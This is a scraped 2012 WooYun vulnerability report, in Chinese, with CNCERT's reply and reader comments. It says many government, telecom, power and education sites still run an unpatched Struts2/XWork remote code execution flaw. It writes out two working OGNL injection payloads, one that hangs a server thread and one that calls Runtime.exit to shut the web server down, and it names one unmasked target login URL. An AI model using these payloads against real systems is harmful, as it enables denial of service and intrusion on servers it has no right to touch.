{"id": 19122, "wybug_id": "wooyun-2012-07633", "wybug_title": "xwork设计缺陷导致远程代码执行即首批政府类入围名单", "wybug_corp": "cncert国家互联网应急中心代", "wybug_author": "shine", "wybug_date": "2012-05-29 12:49", "wybug_open_date": "2012-07-13 12:49", "wybug_type": "系统/服务补丁不及时", "wybug_level": "高", "wybug_rank_0": "5", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-05-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-05-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-06-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-06-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-06-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-07-13：\t细节向公众公开  简要描述：   昨天，听@xsser说：“怀念中国移动大礼包”，如是做了个小测试，看半小时能找多少struts2那个老的远程代码执行漏洞站点或系统，没想到还有这么多，发出来，免得天天被人蹂躏还不知道怎么回事！  以下包括：国家电网、中国电信、中国移动、航空公司、政府部门类、教育类等站点或系统，多次测试结果都可以基本确认漏洞存在（如有误差请包涵！）。 详细说明：     以下站点或系统补丁不及时，测试代码如下（测试效果可能受不同系统架构的影响，如：cache服务器、集群系统、分布式系统，效果请耐心等待，自己没确认的就不方便发出）：sleep当前线程：\n?('\\u0023_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003d\\u0023foo')(\\u0023foo\\u003dnew%20java.lang.Boolean(\"false\")))&(asdf)(('\\u0023rt.sleep(999999999)')(\\u0023rt\\u003d@java.lang.Thread@currentThread()))=1\n关闭web服务器：\n?('\\u0023_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003d\\u0023foo')(\\u0023foo\\u003dnew%20java.lang.Boolean(\"false\")))&(asdf)(('\\u0023rt.exit(1)')(\\u0023rt\\u003d@java.lang.Runtime@getRuntime()))=1\n   漏洞证明：  \n\nmask 区域\n*****ode********************taffLogi********************/doLogi***************1.://**.**.**/kjbm/login.action_***************0/login********************公^**********.com.cn/lo********************.com/log********************n/login********************jmsp/login********************ogin/log********************/jjxt/In********************om/inde********************et/inde********************.cn/ind********************94/inde********************^查其他^**********om.cn/in********************n/95598/in********************同一^**********5598/inde********************cn/index***************2.://**.**.**/pub/index.action_***************op/member!i********************earch/ind********************ireless/in********************3/index********************n/zscsxt/I********************n/index********************Office/ma********************ovie/inde***************3.http://**.**.**/GIS/index.action_**********4.://**.**.**/xtw/news_index.action_**********5.http://**.**.**/portal/index/index.action_***************/shop/membe****************************************cod*****\n\n   修复方案：   使用CNCERT的分发功能，能提醒的都提醒一下吧！（哦！还有一个肯德基宅急送的系统，也分发一下！）\nhttp://www.4008823823.com.cn/kfcios/RegAction/login.action\n   版权声明：转载请注明来源 shine@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2012-05-29 16:34 厂商回复： 感谢shine同学的工作，同时强烈建议shine同学发表技术文档在zone.wooyun.org上。这些事件有一阵子来确认了，幸好目前已经积累了一些可控验证的用例，不过部分案例在复现时仍然不可避免会引起保护性危害。针对近期的struts xwork <=2.2.0远程代码执行漏洞以及thinkphp的漏洞，建议白帽子可以将自己的成果汇总在wooyun上，同时一些有python\\ruby脚本能力的同学，可以尝试完成更高级别的工作（这个可以有大礼包）。rank 20. 最新状态： 2012-06-15：经过多日的验证及协调，目前上述涉及的政府、高校以及电信、电力、证券等相关行业网站已经派发事件完毕。  ", "replys": "漏洞评价：\n评论\n     2012-05-29 13:16 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  标题应该改为：xwork设计缺陷导致远程代码执行暨首批政府类入围名单。难不成还有第二批第三批？-_-||    \n     2012-05-29 13:24 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @horseluke 那是必须的。我擦。我嘞个去。@shine 亲，你还打算近期发多少个？    \n     2012-05-29 15:20 |    \t\t凤凰 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:6        | 涅磐)\t\t \n  happy的入围名单     \n     2012-05-29 16:28 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  由于shine同学的工作，造成CNCERT近期处置压力直线上升（目前仅确认几个，处置的过程中需要复现以明确告知对方，同时避免误报风险）。    \n     2012-05-29 16:59 |    \t\tZ-0ne  \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:38        | 目前专注于工控安全基础研究，工业数据采集...)\t\t \n  哈哈，前排的厮杀还真激烈    \n     2012-05-29 22:56 |    \t\titleaf \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:17        )\t\t \n  处置压力直线上升~此洞必火！    \n     2012-05-30 11:42 |    \t\t顺子 \t\t\t( 普通白帽子  |\t\t\t        Rank:236 漏洞数:36        | 0-0努力像正常青年靠近，再也不当上错图的2...)\t\t \n  @cncert国家互联网应急中心 求礼包！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}